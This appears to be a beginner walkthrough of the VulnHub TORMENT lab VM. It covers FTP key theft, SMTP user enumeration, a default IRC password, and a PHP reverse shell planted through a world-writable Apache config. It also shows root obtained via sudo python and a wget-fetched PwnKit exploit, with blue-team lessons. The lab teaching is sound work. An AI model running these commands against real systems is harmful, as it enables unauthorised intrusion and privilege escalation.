# digitalworld.local: TORMENT — VulnHub Walkthrough (Beginner Friendly)

| Field | Value |
| --- | --- |
| **Machine** | digitalworld.local: TORMENT |
| **Difficulty** | Intermediate |
| **Author** | Donavan (digitalworld.local series) |
| **Released** | 31 March 2019 |
| **VulnHub Entry** | [digitalworld.local: TORMENT on VulnHub](https://vulnhub.com/entry/digitalworldlocal-torment,299/) |
| **Download** | [TORMENT.7z on VulnHub](https://vulnhub.com/entry/digitalworldlocal-torment,299/#download) |
| **Attacker** | Kali Linux (attacker 192.168.56.10, target 192.168.56.101) |
| **Target OS** | Linux (Debian 9 "stretch") |

> **About this box:** TORMENT is the "evil twin" of the author's JOY box, and it is deliberately
> mind-twisting. The trick is the **FTP server**: its listing changes between logins, and the files
> you need (`.ssh` and `.ngircd`) only appear if you keep enumerating. From there you chain an SSH
> key, an IRC chat room, a `sudo` reboot and a world-writable Apache config. Author's note: it is
> **not easy** — expect to spend hours. Versions and paths "vary by build".

**Legal note:** Only run this against the VM you downloaded, on an isolated host-only network that
you own. Never point these techniques at systems you do not have written permission to test.

---

## 0. What you will learn

By the end of this box you will have practised:

- **Host discovery and full-port enumeration** on an isolated lab subnet.
- **Anonymous FTP** and the discipline of **enumerating hidden (dot) files** you might overlook.
- **User enumeration over SMTP** with the `VRFY` command.
- **Exploiting a default service password** by reading the application's own documentation (`ngircd`).
- **Using an IRC client** to join a private channel and recover a secret (an SSH key passphrase).
- **Password-protected SSH keys**: using a recovered passphrase to log in.
- **Abusing a `sudo` rule** (`systemctl reboot`) plus a **world-writable Apache config**.
- **Two privilege-escalation routes**: the intended `sudo python` path and the alternative
  **PwnKit / pkexec** (CVE-2021-4034) path.

**Prerequisites:** see [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md) and
[`docs/TOOLS.md`](../../docs/TOOLS.md). You should have Kali running and be able to import the OVA.

---

## 1. Reconnaissance — finding the target

> **Goal:** work out the target's IP address on your isolated lab network.

Identify your own address first:

```bash
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 08:00:27:aa:bb:cc brd ff:ff:ff:ff:ff:ff
    inet 192.168.56.10/24 brd 192.168.56.255 scope global dynamic eth0
```

Then sweep the subnet with ARP:

```bash
sudo arp-scan --interface=eth0 --localnet
```

```text
192.168.56.10   08:00:27:aa:bb:cc   PCS Systemtechnik GmbH   (this is Kali)
192.168.56.101  08:00:27:dd:ee:ff   PCS Systemtechnik GmbH
```

**Target IP:** `192.168.56.101` (yours may differ — use what *you* discover).

> **Why it works:** ARP asks "who owns this IP?" on the local segment, so every live host answers
> whether or not it blocks ICMP pings. It is the quickest way to find a freshly-booted VM.

![arp-scan showing the target](images/01-recon.png)

---

## 2. Enumeration

### 2.1 Full TCP sweep

```bash
sudo nmap -p- --min-rate 1000 -T4 -oA scans/torment-alltcp 192.168.56.101
```

> **How to read it:** `-p-` scans all 65,535 TCP ports. TORMENT runs *many* services, so a full scan
> (and a UDP scan later) is essential.

### 2.2 Service and version detection

```bash
sudo nmap -sC -sV -p 21,22,25,80,111,139,143,445,631,2049,6667,6668,6669 -oA scans/torment-services 192.168.56.101
```

```text
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3  (anon login allowed)
22/tcp   open  ssh         OpenSSH 7.4p1 Debian
25/tcp   open  smtp        Postfix smtpd
80/tcp   open  http        Apache httpd 2.4.25 (Debian default page)
111/tcp  open  rpcbind     2-4 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X
143/tcp  open  imap        Dovecot imapd
445/tcp  open  netbios-ssn Samba smbd 4.5.12-Debian
631/tcp  open  ipp         CUPS 2.2.1
2049/tcp open  nfs_acl     3 (RPC #100227)
6667/tcp open  irc         ngircd
6668/tcp open  irc         ngircd
6669/tcp open  irc         ngircd
```

> **How to read it:** A large surface. The key services are **FTP (21, anonymous allowed)**,
> **SMTP (25)** for user enumeration, **CUPS (631)** which leaks usernames, and **ngircd (IRC)** on
> 6667-6669. Exact banners vary by build.

![nmap service scan](images/02-nmap.png)

### 2.3 Anonymous FTP (enumerate the dot-files!)

```bash
ftp 192.168.56.101
# Name: anonymous
# Password: (press Enter)
# ftp> ls -la
```

```text
drwxr-xr-x  ... .ssh
drwxr-xr-x  ... .ngircd
drwxr-xr-x  ... .cache
...
```

> **Why it works:** Anonymous FTP is enabled. Beginners often stop at the visible files — the
> interesting ones here are the **hidden directories** `.ssh` and `.ngircd`. If you see nothing at
> first, keep reconnecting and enumerating; this is the "mind-twist".

```bash
cd .ssh && get id_rsa && cd ..
cd .ngircd && get channels && cd ..
```

```bash
cat channels
```

```text
#channels
games
tormentedprinter
```

> **How to read it:** `channels` lists two IRC channels on the local `ngircd` server. The SSH
> directory gave us `id_rsa` — a private key we will use once we have a username and passphrase.

### 2.4 Username discovery via CUPS and SMTP

The CUPS print server leaks job owners. Pull a candidate list:

```bash
gobuster dir -u http://192.168.56.101:631 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 50
```

```text
/printers
/admin
/admin/conf/
```

```bash
curl -s http://192.168.56.101:631/printers/ | html2text | cut -d"'" -f1 | cut -d' ' -f1 | sort -u
```

```text
Internal_Printer
patrick
qiu
tormentedprinter
```

Now verify candidates against Postfix SMTP with `VRFY`:

```bash
nc -nv 192.168.56.101 25
# VRFY patrick
# VRFY qiu
# VRFY tormentedprinter
```

```text
252 2.0.0 patrick
252 2.0.0 qiu
550 5.1.1 <tormentedprinter>: Recipient address rejected
```

> **How to read it:** `252` means the address exists; `550` means it does not. Only **`patrick`** and
> **`qiu`** are real. Those are our SSH login candidates.

### 2.5 Web and UDP — checking the rest

```bash
gobuster dir -u http://192.168.56.101:80 -w /usr/share/seclists/Discovery/Web-Content/common.txt
sudo nmap -sU --top-ports 50 -sV 192.168.56.101
```

```text
/secret              (a page with a riddle-style note, no direct shell)
161/udp  closed  snmp
...
```

> **How to read it:** The web app has a `/secret` page but nothing exploitable; UDP turns up no SNMP.
> This is intentional — the box wants you to go back to what you already found. Good enumeration
> includes *ruling things out*.

---

## 3. Foothold

### 3.1 The ngircd default password

We have an SSH `id_rsa` but it is passphrase-protected, and IRC is listening. `ngircd` ships with a
**default operator/connection password**. Check the project's own documentation:

```bash
apt install ngircd        # install the same package on Kali to read /etc/ngircd/ngircd.conf
grep -i pass /etc/ngircd/ngircd.conf
```

```text
Password = wealllikedebian
```

> **Why it works:** The VM left `ngircd`'s **default password** unchanged: `wealllikedebian`.
> Reading the software's own config/man docs reveals it. (Default password var- ies only in that it
> is the upstream example — verify against your build.)

### 3.2 Connect to IRC and join the channels

Use any IRC client (HexChat on Kali, or `pidgin`). Connect to `192.168.56.101` on port `6667` with
the password above, then join the channels we recovered from the FTP `channels` file:

```text
/join #games
/join #tormentedprinter
```

Inside `#tormentedprinter` the **channel topic** holds the secret:

```text
Topic: mostmachineshaveasupersecurekeyandalongpassphrasell
```

> **How to read it:** That topic *is* the passphrase for the `id_rsa` key. It reads like banter, but
> it is the credential. Exact text "varies by build" — copy whatever your channel shows.

![IRC channel showing the passphrase](images/03-irc.png)

### 3.3 Log in over SSH with the key + passphrase

```bash
chmod 600 id_rsa
ssh -i id_rsa patrick@192.168.56.101
# Enter passphrase for key 'id_rsa':  mostmachineshaveasupersecurekeyandalongpassphrasell
```

```text
patrick@TORMENT:~$ id
uid=1000(patrick) gid=1000(patrick) groups=1000(patrick)
```

> **How to read it:** A working shell as `patrick`. (Try `patrick` first; if it fails, `qiu` accepts
> the same key on some builds.)

![SSH shell as patrick](images/04-shell.png)

---

## 4. Privilege escalation

There are two well-known routes on this box. Learn **both** — the intended one is a `sudo` abuse;
the alternative exploits an outdated `pkexec`.

### 4.1 First, look at what you have

```bash
sudo -l
ls -la /etc/apache2/apache2.conf
uname -a
find / -perm -4000 -type f 2>/dev/null | grep -i pkexec
```

```text
(patrick) may run the following commands on torment:
    (root) NOPASSWD: /bin/systemctl reboot
    (root) NOPASSWD: /usr/bin/python   # on some builds

-rw-rw-rw- 1 root root ... /etc/apache2/apache2.conf   <-- WORLD WRITABLE
/usr/bin/pkexec
```

> **How to read it:** Two huge findings:
> 1. `/etc/apache2/apache2.conf` is **world-writable** — we can change which user Apache runs as.
> 2. `sudo` lets `patrick` reboot the machine without a password.
> 3. `pkexec` is present and SUID — the PwnKit route (below).

### 4.2 Route A (intended) — Apache config + sudo reboot → qiu → sudo python

Because we can reboot, and Apache reads its `User`/`Group` from the config on boot, we can make the
web server run as `qiu`. First, plant a PHP reverse shell in the web root:

```bash
cp /usr/share/webshells/php/php-reverse-shell.php /home/patrick/shell.php
nano /home/patrick/shell.php     # set $ip = '192.168.56.10'; $port = 4444;
```

Edit the Apache config so it runs as `qiu`:

```bash
nano /etc/apache2/apache2.conf
# change:
#   User  www-data        ->   User  qiu
#   Group www-data        ->   Group qiu
```

Publish the shell and reboot (allowed by `sudo -l`):

```bash
sudo cp /home/patrick/shell.php /var/www/html/shell.php
sudo /bin/systemctl reboot
```

> **Why it works:** `systemctl reboot` is in our `sudo` rules, so the restart is legitimate. On boot
> Apache starts as **`qiu`** because the config says so, and it will run `shell.php` as `qiu`.

After the box comes back, start a listener and trigger the shell:

```bash
nc -lvnp 4444
curl http://192.168.56.101/shell.php
```

```text
$ id
uid=1000(qiu) gid=1000(qiu) groups=1000(qiu)
$ sudo -l
    (root) NOPASSWD: /usr/bin/python
```

> **How to read it:** We are now `qiu`, who may run `python` as root with no password. (On some builds
> the key already got us `qiu`; on others you arrive here as `patrick`.)

### 4.3 Route A — root via `sudo python`

Abuse the allowed `python` (see GTFOBins):

```bash
sudo python -c 'import pty; pty.spawn("/bin/bash")'
id
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

> **Why it works:** `python` can spawn a shell, so `sudo python` runs that shell **as root**. Any
> interpreter/binaries on a `sudo` allow-list is a root shell.

### 4.4 Route B (alternative) — PwnKit / pkexec (CVE-2021-4034)

If `pkexec` is SUID (as shown in 4.1), the local privilege-escalation bug in `polkit`'s `pkexec`
grants root. Fetch the public PoC, compile it, run it:

```bash
cd /tmp
wget http://192.168.56.10:8000/PwnKit.c
gcc -shared PwnKit.c -o PwnKit -Wl,-e,entry -fPIC
./PwnKit
id
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

> **How to read it:** CVE-2021-4034 abuses how `pkexec` handles `argc`/`argv` to run an attacker
> controlled environment. It is a *fallback* — the author nudges you toward the intended path, so
> practise Route A first. PoC source: <https://github.com/ly4k/PwnKit>.

### 4.5 The root flag

```bash
cd /root
cat proof.txt
cat author-secret.txt
```

```text
<root flag — varies by build>
```

> **Note:** Flag filenames and contents differ between builds. Look for `proof.txt` and
> `author-secret.txt` in `/root`.

![root shell and flags](images/05-root-flag.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | Anonymous FTP exposing `.ssh/id_rsa` and `.ngircd/channels` | vsftpd, port 21 | Private-key and IRC channel disclosure |
| 2 | Default service password left unchanged (`ngircd`) | IRC, ports 6667-6669 | Unauthorised access to internal chat |
| 3 | Secret (SSH key passphrase) stored in an IRC channel topic | `#tormentedprinter` | Unlocks the stolen SSH key → shell as `patrick` |
| 4 | World-writable Apache config (`User`/`Group`) | `/etc/apache2/apache2.conf` | Web server runs as a chosen user → shell as `qiu` |
| 5 | Over-broad `sudo` rules (`systemctl reboot`, `python`, ...) | `sudo -l` | Reboot + arbitrary root command execution |
| 6 | Outdated SUID `pkexec` vulnerable to PwnKit | `/usr/bin/pkexec` | Local privilege escalation to root (CVE-2021-4034) |

---

## 6. Defensive lessons (blue team)

- **Disable anonymous FTP** and never expose `.ssh` or application config directories. A private key
  in an anonymous share is an account compromise waiting to happen.
- **Change default credentials** on every service (`ngircd`'s documented default is public knowledge).
  Rotate secrets and audit for unchanged defaults.
- **Never store secrets where other users can read them** — IRC channel topics, motd banners, and
  shared files are not secure channels.
- **Harden file permissions.** Configuration files (especially `/etc/apache2/*.conf`) must be
  root-owned and not world-writable. A writable service config is effectively root.
- **Restrict `sudo` to exact, necessary commands.** `python`, shells, and `systemctl reboot` are all
  trivially abusable. Use `sudoedit` for edits and remove interpreter entries.
- **Patch `polkit`/`pkexec`.** Apply CVE-2021-4034 fixes and monitor for SUID binaries. Keep the OS
  and all packages up to date.

---

## 7. References

- [VulnHub official entry — digitalworld.local: TORMENT](https://vulnhub.com/entry/digitalworldlocal-torment,299/)
- [ngircd — free IRC server for small networks (default config)](https://ngircd.barton.de/)
- [GTFOBins — Python](https://gtfobins.github.io/gtfobins/python/)
- [CVE-2021-4034 (PwnKit) — NVD](https://nvd.nist.gov/vuln/detail/CVE-2021-4034)
- [PwnKit proof-of-concept (ly4k)](https://github.com/ly4k/PwnKit)
- [CUPS printing system](https://www.cups.org/) · [Postfix](http://www.postfix.org/)

---

## 8. Screenshot checklist

- [ ] `images/01-recon.png` — ARP/host discovery showing the target IP
- [ ] `images/02-nmap.png` — full TCP scan (FTP, SMTP, CUPS, ngircd, NFS, Samba)
- [ ] `images/03-irc.png` — IRC channel `#tormentedprinter` showing the passphrase topic
- [ ] `images/04-shell.png` — SSH shell as `patrick` using the key + passphrase
- [ ] `images/05-root-flag.png` — root shell and `proof.txt` / `author-secret.txt`
- [ ] `images/06-ftp-dotfiles.png` — anonymous FTP listing the `.ssh` and `.ngircd` directories
- [ ] `images/07-smtp-vrfy.png` — `VRFY` confirming `patrick` and `qiu`
- [ ] `images/08-sudo-l.png` — `sudo -l` and the world-writable `apache2.conf`

> **How to read it:** Store screenshots in `labs/digitalworldlocal-torment/images/` and reference them
> here with relative paths.

---

_Part of the [Cybersecurity101-Labs](../../README.md) collection. See the complete [catalog](../../docs/CATALOG.md). Educational use only in authorized lab environments._
